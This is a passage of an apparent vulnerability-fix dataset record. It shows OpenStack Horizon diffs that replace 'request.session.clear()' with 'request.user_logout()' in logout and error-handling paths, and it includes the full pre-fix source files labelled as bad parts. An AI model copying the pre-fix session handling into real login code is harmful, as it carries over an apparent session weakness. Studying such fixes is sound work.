later.\"),\n","message":"","files":{"\/horizon\/exceptions.py":{"changes":[{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Exceptions raised by the Horizon code and the machinery for handling them. \"\"\" import logging import sys from django.conf import settings from django.contrib import messages from django.utils.translation import ugettext as _ from cloudfiles import errors as swiftclient from glanceclient.common import exceptions as glanceclient from keystoneclient import exceptions as keystoneclient from novaclient import exceptions as novaclient LOG=logging.getLogger(__name__) class HorizonException(Exception): \"\"\" Base exception class for distinguishing our own exception classes. \"\"\" pass class Http302(HorizonException): \"\"\" Error class which can be raised from within a handler to cause an early bailout and redirect at the middleware level. \"\"\" status_code=302 def __init__(self, location, message=None): self.location=location self.message=message class NotAuthorized(HorizonException): \"\"\" Raised whenever a user attempts to access a resource which they do not have role-based access to(such as when failing the :func:`~horizon.decorators.require_roles` decorator). The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthorized`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=401 class NotAuthenticated(HorizonException): \"\"\" Raised when a user is trying to make requests and they are not logged in. The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthenticated`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=403 class NotFound(HorizonException): \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\" status_code=404 class RecoverableError(HorizonException): \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\" status_code=100 class ServiceCatalogException(HorizonException): \"\"\" Raised when a requested service is not available in the ``ServiceCatalog`` returned by Keystone. \"\"\" def __init__(self, service_name): message='Invalid service catalog service: %s' % service_name super(ServiceCatalogException, self).__init__(message) class AlreadyExists(HorizonException): \"\"\" Exception to be raised when trying to create an API resource which already exists. \"\"\" def __init__(self, name, resource_type): self.attrs={\"name\": name, \"resource\": resource_type} self.msg='A %(resource)s with the name \"%(name)s\" already exists.' def __repr__(self): return self.msg % self.attrs def __unicode__(self): return _(self.msg) % self.attrs class HandledException(HorizonException): \"\"\" Used internally to track exceptions that have gone through :func:`horizon.exceptions.handle` more than once. \"\"\" def __init__(self, wrapped): self.wrapped=wrapped HORIZON_CONFIG=getattr(settings, \"HORIZON_CONFIG\",{}) EXCEPTION_CONFIG=HORIZON_CONFIG.get(\"exceptions\",{}) UNAUTHORIZED=(keystoneclient.Unauthorized, keystoneclient.Forbidden, novaclient.Unauthorized, novaclient.Forbidden, glanceclient.AuthorizationFailure, glanceclient.Unauthorized, swiftclient.AuthenticationFailed, swiftclient.AuthenticationError) UNAUTHORIZED +=tuple(EXCEPTION_CONFIG.get('unauthorized',[])) NOT_FOUND=(keystoneclient.NotFound, novaclient.NotFound, glanceclient.NotFound, swiftclient.NoSuchContainer, swiftclient.NoSuchObject) NOT_FOUND +=tuple(EXCEPTION_CONFIG.get('not_found',[])) RECOVERABLE=(keystoneclient.ClientException, keystoneclient.AuthorizationFailure, novaclient.ClientException, glanceclient.ClientException, swiftclient.Error, AlreadyExists) RECOVERABLE +=tuple(EXCEPTION_CONFIG.get('recoverable',[])) def handle(request, message=None, redirect=None, ignore=False, escalate=False): \"\"\" Centralized error handling for Horizon. Because Horizon consumes so many different APIs with completely different ``Exception`` types, it's necessary to have a centralized place for handling exceptions which may be raised. Exceptions are roughly divided into 3 types: problems. These result in being logged out and sent to the login screen. located via the API. These generally result in a user-facing error message, but are otherwise returned to the normal code flow. Optionally a redirect value may be passed to the error handler so users are returned to a different view than the one requested in addition to the error message. but drop directly back to the regular code flow. All other exceptions bubble the stack as normal unless the ``ignore`` argument is passed in as ``True``, in which case only unrecognized errors are bubbled. If the exception is not re-raised, an appropriate wrapper exception class indicating the type of exception that was encountered will be returned. \"\"\" exc_type, exc_value, exc_traceback=sys.exc_info() handled=issubclass(exc_type, HandledException) wrap=False if handled: exc_type, exc_value, exc_traceback=exc_value.wrapped wrap=True if issubclass(exc_type, HorizonException): message=exc_value elif message and \"%(exc)s\" in message: message=message %{\"exc\": exc_value} if issubclass(exc_type, UNAUTHORIZED): if ignore: return NotAuthorized request.session.clear() if not handled: LOG.debug(\"Unauthorized: %s\" % exc_value) fallback=_(\"Unauthorized. Please try logging in again.\") messages.error(request, message or fallback, extra_tags=\"login\") raise NotAuthorized if issubclass(exc_type, NOT_FOUND): wrap=True if not ignore and not handled: LOG.debug(\"Not Found: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return NotFound if issubclass(exc_type, RECOVERABLE): wrap=True if not ignore and not handled: LOG.debug(\"Recoverable error: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return RecoverableError if wrap: raise HandledException([exc_type, exc_value, exc_traceback]) raise exc_type, exc_value, exc_traceback ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nExceptions raised by the Horizon code and the machinery for handling them.\n\"\"\"\n\nimport logging\nimport sys\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.utils.translation import ugettext as _\nfrom cloudfiles import errors as swiftclient\nfrom glanceclient.common import exceptions as glanceclient\nfrom keystoneclient import exceptions as keystoneclient\nfrom novaclient import exceptions as novaclient\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HorizonException(Exception):\n    \"\"\" Base exception class for distinguishing our own exception classes. \"\"\"\n    pass\n\n\nclass Http302(HorizonException):\n    \"\"\"\n    Error class which can be raised from within a handler to cause an\n    early bailout and redirect at the middleware level.\n    \"\"\"\n    status_code = 302\n\n    def __init__(self, location, message=None):\n        self.location = location\n        self.message = message\n\n\nclass NotAuthorized(HorizonException):\n    \"\"\"\n    Raised whenever a user attempts to access a resource which they do not\n    have role-based access to (such as when failing the\n    :func:`~horizon.decorators.require_roles` decorator).\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthorized`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 401\n\n\nclass NotAuthenticated(HorizonException):\n    \"\"\"\n    Raised when a user is trying to make requests and they are not logged in.\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthenticated`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 403\n\n\nclass NotFound(HorizonException):\n    \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\"\n    status_code = 404\n\n\nclass RecoverableError(HorizonException):\n    \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\"\n    status_code = 100  # HTTP status code \"Continue\"\n\n\nclass ServiceCatalogException(HorizonException):\n    \"\"\"\n    Raised when a requested service is not available in the ``ServiceCatalog``\n    returned by Keystone.\n    \"\"\"\n    def __init__(self, service_name):\n        message = 'Invalid service catalog service: %s' % service_name\n        super(ServiceCatalogException, self).__init__(message)\n\n\nclass AlreadyExists(HorizonException):\n    \"\"\"\n    Exception to be raised when trying to create an API resource which\n    already exists.\n    \"\"\"\n    def __init__(self, name, resource_type):\n        self.attrs = {\"name\": name, \"resource\": resource_type}\n        self.msg = 'A %(resource)s with the name \"%(name)s\" already exists.'\n\n    def __repr__(self):\n        return self.msg % self.attrs\n\n    def __unicode__(self):\n        return _(self.msg) % self.attrs\n\n\nclass HandledException(HorizonException):\n    \"\"\"\n    Used internally to track exceptions that have gone through\n    :func:`horizon.exceptions.handle` more than once.\n    \"\"\"\n    def __init__(self, wrapped):\n        self.wrapped = wrapped\n\n\nHORIZON_CONFIG = getattr(settings, \"HORIZON_CONFIG\", {})\nEXCEPTION_CONFIG = HORIZON_CONFIG.get(\"exceptions\", {})\n\n\nUNAUTHORIZED = (keystoneclient.Unauthorized,\n                keystoneclient.Forbidden,\n                novaclient.Unauthorized,\n                novaclient.Forbidden,\n                glanceclient.AuthorizationFailure,\n                glanceclient.Unauthorized,\n                swiftclient.AuthenticationFailed,\n                swiftclient.AuthenticationError)\nUNAUTHORIZED += tuple(EXCEPTION_CONFIG.get('unauthorized', []))\n\nNOT_FOUND = (keystoneclient.NotFound,\n             novaclient.NotFound,\n             glanceclient.NotFound,\n             swiftclient.NoSuchContainer,\n             swiftclient.NoSuchObject)\nNOT_FOUND += tuple(EXCEPTION_CONFIG.get('not_found', []))\n\n\n# NOTE(gabriel): This is very broad, and may need to be dialed in.\nRECOVERABLE = (keystoneclient.ClientException,\n               # AuthorizationFailure is raised when Keystone is \"unavailable\".\n               keystoneclient.AuthorizationFailure,\n               novaclient.ClientException,\n               glanceclient.ClientException,\n               swiftclient.Error,\n               AlreadyExists)\nRECOVERABLE += tuple(EXCEPTION_CONFIG.get('recoverable', []))\n\n\ndef handle(request, message=None, redirect=None, ignore=False, escalate=False):\n    \"\"\" Centralized error handling for Horizon.\n\n    Because Horizon consumes so many different APIs with completely\n    different ``Exception`` types, it's necessary to have a centralized\n    place for handling exceptions which may be raised.\n\n    Exceptions are roughly divided into 3 types:\n\n    #. ``UNAUTHORIZED``: Errors resulting from authentication or authorization\n       problems. These result in being logged out and sent to the login screen.\n    #. ``NOT_FOUND``: Errors resulting from objects which could not be\n       located via the API. These generally result in a user-facing error\n       message, but are otherwise returned to the normal code flow. Optionally\n       a redirect value may be passed to the error handler so users are\n       returned to a different view than the one requested in addition to the\n       error message.\n    #. RECOVERABLE: Generic API errors which generate a user-facing message\n       but drop directly back to the regular code flow.\n\n    All other exceptions bubble the stack as normal unless the ``ignore``\n    argument is passed in as ``True``, in which case only unrecognized\n    errors are bubbled.\n\n    If the exception is not re-raised, an appropriate wrapper exception\n    class indicating the type of exception that was encountered will be\n    returned.\n    \"\"\"\n    exc_type, exc_value, exc_traceback = sys.exc_info()\n\n    # Because the same exception may travel through this method more than\n    # once (if it's re-raised) we may want to treat it differently\n    # the second time (e.g. no user messages\/logging).\n    handled = issubclass(exc_type, HandledException)\n    wrap = False\n\n    # Restore our original exception information, but re-wrap it at the end\n    if handled:\n        exc_type, exc_value, exc_traceback = exc_value.wrapped\n        wrap = True\n\n    # We trust messages from our own exceptions\n    if issubclass(exc_type, HorizonException):\n        message = exc_value\n    # If the message has a placeholder for the exception, fill it in\n    elif message and \"%(exc)s\" in message:\n        message = message % {\"exc\": exc_value}\n\n    if issubclass(exc_type, UNAUTHORIZED):\n        if ignore:\n            return NotAuthorized\n        request.session.clear()\n        if not handled:\n            LOG.debug(\"Unauthorized: %s\" % exc_value)\n            # We get some pretty useless error messages back from\n            # some clients, so let's define our own fallback.\n            fallback = _(\"Unauthorized. Please try logging in again.\")\n            messages.error(request, message or fallback, extra_tags=\"login\")\n        raise NotAuthorized  # Redirect handled in middleware\n\n    if issubclass(exc_type, NOT_FOUND):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Not Found: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return NotFound  # return to normal code flow\n\n    if issubclass(exc_type, RECOVERABLE):\n        wrap = True\n        if not ignore and not handled:\n            LOG.debug(\"Recoverable error: %s\" % exc_value)\n            messages.error(request, message or exc_value)\n        if redirect:\n            raise Http302(redirect)\n        if not escalate:\n            return RecoverableError  # return to normal code flow\n\n    # If we've gotten here, time to wrap and\/or raise our exception.\n    if wrap:\n        raise HandledException([exc_type, exc_value, exc_traceback])\n    raise exc_type, exc_value, exc_traceback\n"},"\/horizon\/users.py":{"changes":[{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\")","add":1,"remove":1,"filename":"\/horizon\/users.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Classes and methods related to user handling in Horizon. \"\"\" import logging from django.utils.translation import ugettext as _ from horizon import api from horizon import exceptions LOG=logging.getLogger(__name__) def get_user_from_request(request): \"\"\" Checks the current session and returns a:class:`~horizon.users.User`. If the session contains user data the User will be treated as authenticated and the:class:`~horizon.users.User` will have all its attributes set. If not, the:class:`~horizon.users.User` will have no attributes set. If the session contains invalid data, :exc:`~horizon.exceptions.NotAuthorized` will be raised. \"\"\" if 'user_id' not in request.session: return User() try: return User(id=request.session['user_id'], token=request.session['token'], user=request.session['user_name'], tenant_id=request.session['tenant_id'], tenant_name=request.session['tenant'], service_catalog=request.session['serviceCatalog'], roles=request.session['roles'], request=request) except KeyError: LOG.exception(\"Error while creating User from session.\") request.session.clear() raise exceptions.NotAuthorized(_(\"Your session has expired. \" \"Please log in again.\")) class LazyUser(object): def __get__(self, request, obj_type=None): if not hasattr(request, '_cached_user'): request._cached_user=get_user_from_request(request) return request._cached_user class User(object): \"\"\" The main user class which Horizon expects. .. attribute:: token The id of the Keystone token associated with the current user\/tenant. .. attribute:: username The name of the current user. .. attribute:: tenant_id The id of the Keystone tenant for the current user\/token. .. attribute:: tenant_name The name of the Keystone tenant for the current user\/token. .. attribute:: service_catalog The ``ServiceCatalog`` data returned by Keystone. .. attribute:: roles A list of dictionaries containing role names and ids as returned by Keystone. .. attribute:: admin Boolean value indicating whether or not this user has admin privileges. Internally mapped to:meth:`horizon.users.User.is_admin`. \"\"\" def __init__(self, id=None, token=None, user=None, tenant_id=None, service_catalog=None, tenant_name=None, roles=None, authorized_tenants=None, request=None): self.id=id self.token=token self.username=user self.tenant_id=tenant_id self.tenant_name=tenant_name self.service_catalog=service_catalog self.roles=roles or[] self._authorized_tenants=authorized_tenants self._request=request def is_authenticated(self): \"\"\" Evaluates whether this:class:`.User` instance has been authenticated. Returns ``True`` or ``False``. \"\"\" return self.token @property def admin(self): return self.is_admin() def is_admin(self): \"\"\" Evaluates whether this user has admin privileges. Returns ``True`` or ``False``. \"\"\" for role in self.roles: if role['name'].lower()=='admin': return True return False def get_and_delete_messages(self): \"\"\" Placeholder function for parity with ``django.contrib.auth.models.User``. \"\"\" return[] @property def authorized_tenants(self): if self.is_authenticated() and self._authorized_tenants is None: try: token=self._request.session.get(\"unscoped_token\", self.token) authd=api.tenant_list_for_token(self._request, token) except: authd=[] LOG.exception('Could not retrieve tenant list.') self._authorized_tenants=authd return self._authorized_tenants @authorized_tenants.setter def authorized_tenants(self, tenant_list): self._authorized_tenants=tenant_list ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nClasses and methods related to user handling in Horizon.\n\"\"\"\n\nimport logging\n\nfrom django.utils.translation import ugettext as _\n\nfrom horizon import api\nfrom horizon import exceptions\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef get_user_from_request(request):\n    \"\"\" Checks the current session and returns a :class:`~horizon.users.User`.\n\n    If the session contains user data the User will be treated as\n    authenticated and the :class:`~horizon.users.User` will have all\n    its attributes set.\n\n    If not, the :class:`~horizon.users.User` will have no attributes set.\n\n    If the session contains invalid data,\n    :exc:`~horizon.exceptions.NotAuthorized` will be raised.\n    \"\"\"\n    if 'user_id' not in request.session:\n        return User()\n    try:\n        return User(id=request.session['user_id'],\n                    token=request.session['token'],\n                    user=request.session['user_name'],\n                    tenant_id=request.session['tenant_id'],\n                    tenant_name=request.session['tenant'],\n                    service_catalog=request.session['serviceCatalog'],\n                    roles=request.session['roles'],\n                    request=request)\n    except KeyError:\n        # If any of those keys are missing from the session it is\n        # overwhelmingly likely that we're dealing with an outdated session.\n        LOG.exception(\"Error while creating User from session.\")\n        request.session.clear()\n        raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                         \"Please log in again.\"))\n\n\nclass LazyUser(object):\n    def __get__(self, request, obj_type=None):\n        if not hasattr(request, '_cached_user'):\n            request._cached_user = get_user_from_request(request)\n        return request._cached_user\n\n\nclass User(object):\n    \"\"\" The main user class which Horizon expects.\n\n    .. attribute:: token\n\n        The id of the Keystone token associated with the current user\/tenant.\n\n    .. attribute:: username\n\n        The name of the current user.\n\n    .. attribute:: tenant_id\n\n        The id of the Keystone tenant for the current user\/token.\n\n    .. attribute:: tenant_name\n\n        The name of the Keystone tenant for the current user\/token.\n\n    .. attribute:: service_catalog\n\n        The ``ServiceCatalog`` data returned by Keystone.\n\n    .. attribute:: roles\n\n        A list of dictionaries containing role names and ids as returned\n        by Keystone.\n\n    .. attribute:: admin\n\n        Boolean value indicating whether or not this user has admin\n        privileges. Internally mapped to :meth:`horizon.users.User.is_admin`.\n    \"\"\"\n    def __init__(self, id=None, token=None, user=None, tenant_id=None,\n                    service_catalog=None, tenant_name=None, roles=None,\n                    authorized_tenants=None, request=None):\n        self.id = id\n        self.token = token\n        self.username = user\n        self.tenant_id = tenant_id\n        self.tenant_name = tenant_name\n        self.service_catalog = service_catalog\n        self.roles = roles or []\n        self._authorized_tenants = authorized_tenants\n        # Store the request for lazy fetching of auth'd tenants\n        self._request = request\n\n    def is_authenticated(self):\n        \"\"\"\n        Evaluates whether this :class:`.User` instance has been authenticated.\n        Returns ``True`` or ``False``.\n        \"\"\"\n        # TODO: deal with token expiration\n        return self.token\n\n    @property\n    def admin(self):\n        return self.is_admin()\n\n    def is_admin(self):\n        \"\"\"\n        Evaluates whether this user has admin privileges. Returns\n        ``True`` or ``False``.\n        \"\"\"\n        for role in self.roles:\n            if role['name'].lower() == 'admin':\n                return True\n        return False\n\n    def get_and_delete_messages(self):\n        \"\"\"\n        Placeholder function for parity with\n        ``django.contrib.auth.models.User``.\n        \"\"\"\n        return []\n\n    @property\n    def authorized_tenants(self):\n        if self.is_authenticated() and self._authorized_tenants is None:\n            try:\n                token = self._request.session.get(\"unscoped_token\", self.token)\n                authd = api.tenant_list_for_token(self._request, token)\n            except:\n                authd = []\n                LOG.exception('Could not retrieve tenant list.')\n            self._authorized_tenants = authd\n        return self._authorized_tenants\n\n    @authorized_tenants.setter\n    def authorized_tenants(self, tenant_list):\n        self._authorized_tenants = tenant_list\n"},"\/horizon\/views\/auth.py":{"changes":[{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]},{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]}],"source":"\n import logging from django import shortcuts from django.conf import settings from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ import horizon from horizon import api from horizon import exceptions from horizon import forms from horizon import users from horizon.base import Horizon from horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data LOG=logging.getLogger(__name__) def user_home(request): \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\" return shortcuts.redirect(horizon.get_user_home(request.user)) class LoginView(forms.ModalFormView): \"\"\" Logs in a user and redirects them to the URL specified by :func:`horizon.get_user_home`. \"\"\" form_class=Login template_name=\"horizon\/auth\/login.html\" def get_context_data(self, **kwargs): context=super(LoginView, self).get_context_data(**kwargs) redirect_to=self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") context[\"redirect_field_name\"]=REDIRECT_FIELD_NAME context[\"next\"]=redirect_to return context def get_initial(self): initial=super(LoginView, self).get_initial() current_region=self.request.session.get('region_endpoint', None) requested_region=self.request.GET.get('region', None) regions=dict(getattr(settings, \"AVAILABLE_REGIONS\",[])) if requested_region in regions and requested_region !=current_region: initial.update({'region': requested_region}) return initial def switch_tenants(request, tenant_id): \"\"\" Swaps a user from one tenant to another using the unscoped token from Keystone to exchange scoped tokens for the new tenant. \"\"\" form, handled=LoginWithTenant.maybe_handle( request, initial={'tenant': tenant_id, 'username': request.user.username}) if handled: return handled unscoped_token=request.session.get('unscoped_token', None) if unscoped_token: try: token=api.token_create_scoped(request, tenant_id, unscoped_token) _set_session_data(request, token) user=users.User(users.get_user_from_request(request)) return shortcuts.redirect(Horizon.get_user_home(user)) except: exceptions.handle(request, _(\"You are not authorized for that tenant.\")) return shortcuts.redirect(\"horizon:auth_login\") def logout(request): \"\"\" Clears the session and logs the current user out. \"\"\" request.session.clear() return shortcuts.redirect('splash') ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\n\nimport horizon\nfrom horizon import api\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\nfrom horizon.base import Horizon\nfrom horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef user_home(request):\n    \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\"\n    return shortcuts.redirect(horizon.get_user_home(request.user))\n\n\nclass LoginView(forms.ModalFormView):\n    \"\"\"\n    Logs in a user and redirects them to the URL specified by\n    :func:`horizon.get_user_home`.\n    \"\"\"\n    form_class = Login\n    template_name = \"horizon\/auth\/login.html\"\n\n    def get_context_data(self, **kwargs):\n        context = super(LoginView, self).get_context_data(**kwargs)\n        redirect_to = self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n        context[\"redirect_field_name\"] = REDIRECT_FIELD_NAME\n        context[\"next\"] = redirect_to\n        return context\n\n    def get_initial(self):\n        initial = super(LoginView, self).get_initial()\n        current_region = self.request.session.get('region_endpoint', None)\n        requested_region = self.request.GET.get('region', None)\n        regions = dict(getattr(settings, \"AVAILABLE_REGIONS\", []))\n        if requested_region in regions and requested_region != current_region:\n            initial.update({'region': requested_region})\n        return initial\n\n\ndef switch_tenants(request, tenant_id):\n    \"\"\"\n    Swaps a user from one tenant to another using the unscoped token from\n    Keystone to exchange scoped tokens for the new tenant.\n    \"\"\"\n    form, handled = LoginWithTenant.maybe_handle(\n            request, initial={'tenant': tenant_id,\n                              'username': request.user.username})\n    if handled:\n        return handled\n\n    unscoped_token = request.session.get('unscoped_token', None)\n    if unscoped_token:\n        try:\n            token = api.token_create_scoped(request,\n                                            tenant_id,\n                                            unscoped_token)\n            _set_session_data(request, token)\n            user = users.User(users.get_user_from_request(request))\n            return shortcuts.redirect(Horizon.get_user_home(user))\n        except:\n            exceptions.handle(request,\n                              _(\"You are not authorized for that tenant.\"))\n\n    return shortcuts.redirect(\"horizon:auth_login\")\n\n\ndef logout(request):\n    \"\"\" Clears the session and logs the current user out. \"\"\"\n    request.session.clear()\n    # FIXME(gabriel): we don't ship a view named splash\n    return shortcuts.redirect('splash')\n"},"\/horizon\/views\/auth_forms.py":{"changes":[{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]},{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]}],"source":"\n \"\"\" Forms used for Horizon's auth mechanisms. \"\"\" import logging from django import shortcuts from django.conf import settings from django.contrib import messages from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ from keystoneclient import exceptions as keystone_exceptions from horizon import api from horizon import base from horizon import exceptions from horizon import forms from horizon import users LOG=logging.getLogger(__name__) def _set_session_data(request, token): request.session['serviceCatalog']=token.serviceCatalog request.session['tenant']=token.tenant['name'] request.session['tenant_id']=token.tenant['id'] request.session['token']=token.id request.session['user_name']=token.user['name'] request.session['user_id']=token.user['id'] request.session['roles']=token.user['roles'] class Login(forms.SelfHandlingForm): \"\"\" Form used for logging in a user. Handles authentication with Keystone, choosing a tenant, and fetching a scoped token token for that tenant. Redirects to the URL returned by:meth:`horizon.get_user_home` if successful. Subclass of:class:`~horizon.forms.SelfHandlingForm`. \"\"\" region=forms.ChoiceField(label=_(\"Region\"), required=False) username=forms.CharField(label=_(\"User Name\")) password=forms.CharField(label=_(\"Password\"), widget=forms.PasswordInput(render_value=False)) def __init__(self, *args, **kwargs): super(Login, self).__init__(*args, **kwargs) default_region=(settings.OPENSTACK_KEYSTONE_URL, \"Default Region\") regions=getattr(settings, 'AVAILABLE_REGIONS',[default_region]) self.fields['region'].choices=regions if len(regions)==1: self.fields['region'].initial=default_region[0] self.fields['region'].widget=forms.widgets.HiddenInput() def handle(self, request, data): endpoint=data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL region_name=dict(self.fields['region'].choices)[endpoint] request.session['region_endpoint']=endpoint request.session['region_name']=region_name redirect_to=request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") if data.get('tenant', None): try: token=api.token_create(request, data.get('tenant'), data['username'], data['password']) tenants=api.tenant_list_for_token(request, token.id) except: msg=_('Unable to authenticate for that project.') exceptions.handle(request, message=msg, escalate=True) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) elif data.get('username', None): try: unscoped_token=api.token_create(request, '', data['username'], data['password']) except keystone_exceptions.Unauthorized: exceptions.handle(request, _('Invalid user name or password.')) except: request.session.clear() exceptions.handle(request, message=_(\"An error occurred authenticating.\" \" Please try again later.\"), escalate=True) request.session['unscoped_token']=unscoped_token.id request.user.username=data['username'] try: tenants=api.tenant_list_for_token(request, unscoped_token.id) except: exceptions.handle(request) tenants=[] if not tenants: messages.error(request, _('You are not authorized for any projects.') % {\"user\": data['username']}, extra_tags=\"login\") return while tenants: tenant=tenants.pop() try: token=api.token_create_scoped(request, tenant.id, unscoped_token.id) break except: exceptions.handle(request, ignore=True) token=None if token is None: raise exceptions.NotAuthorized( _(\"You are not authorized for any available projects.\")) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) class LoginWithTenant(Login): \"\"\" Exactly like:class:`.Login` but includes the tenant id as a field so that the process of choosing a default tenant is bypassed. \"\"\" region=forms.ChoiceField(required=False) username=forms.CharField(max_length=\"20\", widget=forms.TextInput(attrs={'readonly': 'readonly'})) tenant=forms.CharField(widget=forms.HiddenInput()) ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the 